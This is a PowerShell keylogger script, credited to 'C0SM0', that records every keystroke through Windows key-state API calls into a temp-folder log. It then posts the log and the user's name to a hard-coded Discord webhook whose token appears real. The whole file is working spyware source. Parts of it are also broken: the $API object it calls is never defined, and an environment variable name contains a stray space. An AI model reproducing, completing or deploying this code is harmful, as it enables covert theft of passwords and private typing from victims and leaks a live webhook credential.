# powershell keylogger
# created by : C0SM0

# webhook, CHANGE ME
$webhook = "https://discord.com/api/webhooks/1380976425208778935/BYngRi6W-bJS40mQiRLo6enK1A4YajR8qR0jExZTA4zuPr6i7c4G4SYUCSpPxzhllBke"

# write pid
$PID > "$env:temp/DdBPKCytRe"

# keylogger
function KeyLogger($logFile="$env:temp/$env:User Name.log") {
  
  # generate log file if it doesn't exist
  if (-not (Test-Path $logFile)) {
      New-Item -Path $logFile -ItemType File -Force
  }

  # attempt to log keystrokes
  try {
    while ($true) {
      Start-Sleep -Milliseconds 40

      for ($ascii = 9; $ascii -le 254; $ascii++) {
        # use API to get key state
        $keystate = $API::GetAsyncKeyState($ascii)

        # use API to detect keystroke
        if ($keystate -eq -32767) {
          $null = [console]::CapsLock

          # map virtual key
          $mapKey = $API::MapVirtualKey($ascii, 3)

          # create a stringbuilder
          $keyboardState = New-Object Byte[] 256
          $hideKeyboardState = $API::GetKeyboardState($keyboardState)
          $loggedchar = New-Object -TypeName System.Text.StringBuilder

          # translate virtual key
          if ($API::ToUnicode($ascii, $mapKey, $keyboardState, $loggedchar, $loggedchar.Capacity, 0)) {
            # add logged key to file
            [System.IO.File]::AppendAllText($logFile, $loggedchar.ToString(), [System.Text.Encoding]::Unicode)
          }
        }
      }
    }
  }
  catch {
    # Log the error for debugging
    Add-Content -Path "$env:TEMP\error_log.txt" -Value "Error in KeyLogger: $_"
  }
  finally {
    # send logs via webhook
    $logs = Get-Content "$logFile" | Out-String
    $Body = @{
      'username' = $env:User Name
      'content' = $logs
    }
    
    # Convert the hashtable to a JSON string
    $JsonBody = $Body | ConvertTo-Json

    # Try to send the message
    try {
        $response = Invoke-RestMethod -Uri $webhook -Method 'POST' -Body $JsonBody -ContentType 'application/json'
        Write-Host "Logs sent successfully: $response"
    } catch {
        # Log the error
        Add-Content -Path "$env:TEMP\error_log.txt" -Value "Error sending logs: $_"
        Write-Host "Failed to send logs: $_"
    }
  }
}

# run keylogger
KeyLogger
